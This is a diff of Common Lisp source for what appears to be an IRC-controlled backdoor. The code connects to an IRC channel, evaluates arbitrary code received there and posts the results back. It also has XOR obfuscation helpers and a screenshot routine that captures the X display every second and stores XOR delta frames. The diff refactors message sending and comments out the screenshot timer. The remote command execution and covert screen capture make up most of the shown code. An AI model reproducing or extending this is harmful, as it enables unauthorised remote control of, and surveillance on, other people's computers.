@@ -169,8 +169,12 @@
 (defparameter *irc-chan* "#nvrtlessfndout")
 (defparameter *irc-lock* (bt:make-lock "irc-lock"))
 (defparameter *irc-conn* nil)
-(defparameter *irc-lock* (bt:make-lock "irc-lock"))
 
+(defmacro sendmsg (msg &rest params)
+  `(bt:with-lock-held (*irc-lock*)
+     (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))))
+
+;; irc-hook
 ;; irc_cmd_proc
 ;; seq_xor
 (defun seq-xor (len seq-1 seq-2)
@@ -195,10 +199,6 @@
          (len (length oct))
          (gam (funcall gen len)))
     (seq-xor len oct gam)))
-;; bprint
-(defmacro bprint (var)
-  `(subseq (with-output-to-string (*standard-output*)
-             (pprint ,var)) 1))
 
 (defparameter *irc-cmd*
   (lambda (param)
@@ -217,15 +217,10 @@
         (let ((result (handler-case (bprint (eval (read-from-string  str)))
                         (t (err)
                           (dbg "::irc-cmd error: ~A~%" (type-of err))
-                          (bt:with-lock-held (*irc-lock*)
-                            (cl-irc:privmsg
-                             *irc-conn* *irc-chan*
-                             (format nil "ERR: [~A]" (type-of err))))
+                          (sendmsg "ERR: [~A]" (type-of err))
                           (return-from irc-cmd-block nil)))))
           (setf *watchdog-timer* 0)
-          (bt:with-lock-held (*irc-lock*)
-            (cl-irc:privmsg *irc-conn* *irc-chan*
-                            (format nil "=> ~A" result)))
+          (sendmsg "=> ~A" result)
           (dbg "::=> ~A~%" result)
           (finish-output))))))
 
@@ -267,9 +262,8 @@
     (cl-irc:join *irc-conn* *irc-chan*))
   (sleep 1)
   (bt:with-lock-held (*irc-lock*)
-    (cl-irc:privmsg
-     *irc-conn* *irc-chan*
-     (format nil "hi"))))
+    (setf *connection-established-flag* t))
+  (sendmsg "hi"))
 
 (defun irc-loop ()
   (bt:make-thread
@@ -281,8 +275,7 @@
      (*irc-serv* . ,*irc-serv*)
      (*irc-chan* . ,*irc-chan*)
      (*irc-lock* . ,*irc-lock*)
-     (*irc-conn* . ,*irc-conn*)
-     (*irc-lock* . ,*irc-lock*)))
+     (*irc-conn* . ,*irc-conn*)))
   (handler-case (cl-irc:read-message-loop *irc-conn*)
     (SB-INT:SIMPLE-STREAM-ERROR (err)
       (dbg "::irc-loop error: ~A~%" (type-of err)))
@@ -599,6 +592,63 @@ Content-Type: application/octet-stream
 ;;     (format nil "~A"
 ;;             (bprint file-info))))
 
+(defun shot ()
+  ;; (dbg "~A~%" *shot-threads*)
+  ;; (sendmsg "shot started")
+  (sleep 100))
+
+;; (defparameter *shot-timer*
+;;   (make-timer #'(lambda ()
+;;                   (shot))
+;;               :name "shot" :thread t))
+
+;; (defparameter *stop* nil)
+
+;; (let ((prev)
+;;       (cnt 9999))
+;;   (defun shot ()
+;;     (let* ((snap (pack-image (x-snapshot)))
+;;            (dims (array-dimensions snap)))
+;;       (if (> cnt 4)
+;;           (progn
+;;             (save "~A" dims snap)
+;;             (setf prev snap)
+;;             (setf cnt 0))
+;;           ;; else
+;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
+;;             (do ((qy 0 (incf qy)))
+;;                 ((= qy (car dims)))
+;;               (declare (type fixnum qy))
+;;               (do ((qx 0 (incf qx)))
+;;                   ((= qx (cadr dims)))
+;;                 (declare (type fixnum qx))
+;;                 (setf (aref xored qy qx)
+;;                       (logxor (aref prev qy qx)
+;;                               (aref snap qy qx)))))
+;;             (save (format nil "~~A_~A" cnt) dims xored)
+;;             (setf prev snap)
+;;             (incf cnt))))))
+
+;; (schedule-timer *shot-timer* 1 :repeat-interval 1)
+
+
+
+(defun save-png (width height pathname-str image
+                 &optional (color-type :truecolor-alpha))
+  (let* ((png (make-instance 'zpng:png :width width :height height
+                             :color-type color-type))
+         (vector (make-array ;; displaced vector - need copy for save
+                  (* height width (zpng:samples-per-pixel png))
+                  :displaced-to image :element-type '(unsigned-byte 8))))
+    ;; Тут применен потенциально опасный трюк, когда мы создаем
+    ;; объект PNG без данных, а потом добавляем в него данные,
+    ;; используя неэкспортируемый writer.
+    ;; Это нужно чтобы получить третью размерность массива,
+    ;; который мы хотим передать как данные и при этом
+    ;; избежать создания для этого временного объекта
+    (setf (zpng::%image-data png) (copy-seq vector))
+    (zpng:write-png png pathname-str)))
+
 (defun save (frmt-filename-str dims image)
   (block save-block
     (let* ((height     (car  dims))
@@ -632,55 +682,3 @@ Content-Type: application/octet-stream
       ;;                              :element-type '(unsigned-byte 8))
       ;;   (write-sequence decoded file-stream))
       )))
-
-(defparameter *shot-timer*
-  (make-timer #'(lambda ()
-                  (shot))
-              :name "shot" :thread t))
-
-;; (defparameter *stop* nil)
-
-(let ((prev)
-      (cnt 9999))
-  (defun shot ()
-    (let* ((snap (pack-image (x-snapshot)))
-           (dims (array-dimensions snap)))
-      (if (> cnt 4)
-          (progn
-            (save "~A" dims snap)
-            (setf prev snap)
-            (setf cnt 0))
-          ;; else
-          (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-            (do ((qy 0 (incf qy)))
-                ((= qy (car dims)))
-              (declare (type fixnum qy))
-              (do ((qx 0 (incf qx)))
-                  ((= qx (cadr dims)))
-                (declare (type fixnum qx))
-                (setf (aref xored qy qx)
-                      (logxor (aref prev qy qx)
-                              (aref snap qy qx)))))
-            (save (format nil "~~A_~A" cnt) dims xored)
-            (setf prev snap)
-            (incf cnt))))))
-
-(schedule-timer *shot-timer* 1 :repeat-interval 1)
-
-
-
-(defun save-png (width height pathname-str image
-                 &optional (color-type :truecolor-alpha))
-  (let* ((png (make-instance 'zpng:png :width width :height height
-                             :color-type color-type))
-         (vector (make-array ;; displaced vector - need copy for save
-                  (* height width (zpng:samples-per-pixel png))
-                  :displaced-to image :element-type '(unsigned-byte 8))))
-    ;; Тут применен потенциально опасный трюк, когда мы создаем
-    ;; объект PNG без данных, а потом добавляем в него данные,
-    ;; используя неэкспортируемый writer.
-    ;; Это нужно чтобы получить третью размерность массива,
-    ;; который мы хотим передать как данные и при этом
-    ;; избежать создания для этого временного объекта
-    (setf (zpng::%image-data png) (copy-seq vector))
-    (zpng:write-png png pathname-str)))
